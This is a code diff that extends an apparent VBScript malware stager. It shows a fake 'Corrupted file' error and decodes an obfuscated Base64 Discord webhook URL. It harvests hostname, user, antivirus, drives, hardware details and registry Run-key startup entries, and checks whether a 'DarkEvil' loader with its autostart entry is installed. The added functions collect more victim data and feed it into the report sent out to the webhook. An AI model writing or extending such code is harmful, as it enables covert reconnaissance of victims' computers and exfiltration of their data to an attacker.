@@ -5551,6 +5551,7 @@ d1 x6
 MsgBox "Corrupted file: " & Err.Description, 48, "Error!"
 
 
+
 Function Base64Decode(base64)
     Dim xml, node
     Set xml = CreateObject("Msxml2.DOMDocument.3.0")
@@ -5640,6 +5641,160 @@ Function GetDrives()
     End If
 End Function
 
+
+Function GetTotalRAM()
+    On Error Resume Next
+    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
+    Set colSys = objWMI.ExecQuery("Select TotalPhysicalMemory from Win32_ComputerSystem")
+    For Each sys in colSys
+        Dim total
+        total = CDbl(sys.TotalPhysicalMemory)
+        GetTotalRAM = Round(total / 1073741824, 1) & " GB"
+        Exit Function
+    Next
+    GetTotalRAM = "Unknown"
+End Function
+
+
+Function GetRAMModules()
+    On Error Resume Next
+    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
+    Set colRAM = objWMI.ExecQuery("Select Capacity, Manufacturer, Speed from Win32_PhysicalMemory")
+    Dim moduleList, ramSize, entry
+    moduleList = ""
+    For Each ram In colRAM
+        ramSize = CDbl(ram.Capacity) / 1073741824
+        entry = Round(ramSize, 1) & " GB @ " & ram.Speed & " MHz (" & ram.Manufacturer & ")"
+        moduleList = moduleList & entry & ", "
+    Next
+    If Len(moduleList) = 0 Then
+        GetRAMModules = "No RAM modules found"
+    Else
+        GetRAMModules = Left(moduleList, Len(moduleList) - 2)
+    End If
+End Function
+
+
+
+Function GetCPUName()
+    On Error Resume Next
+    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
+    Set colCPU = objWMI.ExecQuery("Select Name from Win32_Processor")
+    For Each cpu in colCPU
+        GetCPUName = Trim(cpu.Name)
+        Exit Function
+    Next
+    GetCPUName = "Unknown"
+End Function
+
+Function GetGPUName()
+    On Error Resume Next
+    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
+    Set colGPU = objWMI.ExecQuery("Select Name from Win32_VideoController")
+    Dim gpus
+    gpus = ""
+    For Each gpu in colGPU
+        gpus = gpus & gpu.Name & ", "
+    Next
+    If Len(gpus) > 0 Then
+        GetGPUName = Left(gpus, Len(gpus) - 2)
+    Else
+        GetGPUName = "Unknown"
+    End If
+End Function
+
+
+Function HKEYFromRoot(path)
+    Select Case True
+        Case InStr(path, "HKLM") > 0: HKEYFromRoot = &H80000002
+        Case InStr(path, "HKCU") > 0: HKEYFromRoot = &H80000001
+    End Select
+End Function
+
+Function GetStartupPrograms()
+    On Error Resume Next
+    Dim WshShell, regPaths, path, output, subOutput
+    Set WshShell = CreateObject("WScript.Shell")
+    
+    regPaths = Array( _
+        "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", _
+        "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" _
+    )
+    
+    output = ""
+    For Each path In regPaths
+        subOutput = ""
+        Set objReg = GetObject("winmgmts:\\.\root\default:StdRegProv")
+        
+        Dim valueNames, types, i, value
+        objReg.EnumValues HKEYFromRoot(path), SubKeyFromPath(path), valueNames, types
+        
+        If IsArray(valueNames) Then
+            For i = 0 To UBound(valueNames)
+                objReg.GetStringValue HKEYFromRoot(path), SubKeyFromPath(path), valueNames(i), value
+                subOutput = subOutput & "  " & valueNames(i) & " = " & value & vbCrLf
+            Next
+        Else
+            subOutput = "  (No values)" & vbCrLf
+        End If
+        
+        If Trim(subOutput) <> "" Then
+            output = output & "[" & path & "]" & vbCrLf & subOutput
+        End If
+    Next
+
+    If Len(output) = 0 Then
+        GetStartupPrograms = "No startup entries found."
+    Else
+        GetStartupPrograms = Trim(output)
+    End If
+End Function
+
+
+Function SubKeyFromPath(path)
+    SubKeyFromPath = Mid(path, InStr(path, "\") + 1)
+End Function
+
+
+Function CheckDarkEvilStatus()
+    On Error Resume Next
+    Dim fso, basePath, requiredFiles, i, filePath
+    Set fso = CreateObject("Scripting.FileSystemObject")
+
+    basePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%systemdrive%\Dark\")
+
+    requiredFiles = Array( _
+        "DELoader.bat", _
+        "DELoader_x32.dll", _
+        "DELoader_x64.dll", _
+        "EncodeDataX64", _
+        "EncodeDataX86", _
+        "tigger.vbs" _
+    )
+
+    For i = 0 To UBound(requiredFiles)
+        filePath = basePath & requiredFiles(i)
+        If Not fso.FileExists(filePath) Then
+            CheckDarkEvilStatus = "Failed to install DarkEvil"
+            Exit Function
+        End If
+    Next
+
+    Dim WshShell, regPath, value
+    Set WshShell = CreateObject("WScript.Shell")
+    regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\DELoaderClient"
+
+    On Error Resume Next
+    value = WshShell.RegRead(regPath)
+
+    If LCase(Trim(value)) = LCase("C:\Dark\tigger.vbs") Then
+        CheckDarkEvilStatus = "DarkEvil Installed"
+    Else
+        CheckDarkEvilStatus = "DarkEvil is installed but cannot autostart"
+    End If
+End Function
+
+
 Function EscapeJson(str)
     str = Replace(str, "\", "\\")
     str = Replace(str, """", "\""")
@@ -5654,13 +5809,20 @@ encodedUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjQxODc2ODczODU4Mj
 decodedBytes = Base64Decode(encodedUrl)
 webhookUrl = BytesToStr(decodedBytes)
 
-info = "**System Info Captured by Kali GPT**" & vbCrLf & _
+info = "**[SYSTEM INFO CAPTURED]**" & vbCrLf & _
        "**Hostname:** " & GetHostName() & vbCrLf & _
        "**Username:** " & GetUsername() & vbCrLf & _
        "**OS:** " & GetWinVersion() & vbCrLf & _
        "**Architecture:** " & GetArch() & vbCrLf & _
        "**Antivirus:** " & GetAntivirus() & vbCrLf & _
-       "**Drives:** " & GetDrives()
+       "**Drives:** " & GetDrives() & vbCrLf & _
+		"**CPU:** " & GetCPUName() & vbCrLf & _
+	   "**GPU:** " & GetGPUName() & vbCrLf & _
+	   "**Total RAM:** " & GetTotalRAM() & vbCrLf & _
+	   "**RAM Module:** " & GetRAMModules() & vbCrLf & _
+	   "**StartUp Prorgams:** " & GetStartupPrograms() & vbCrLf & _
+	   "**DarkEvil:** " & CheckDarkEvilStatus()
+
 
 escapedInfo = EscapeJson(info)
 
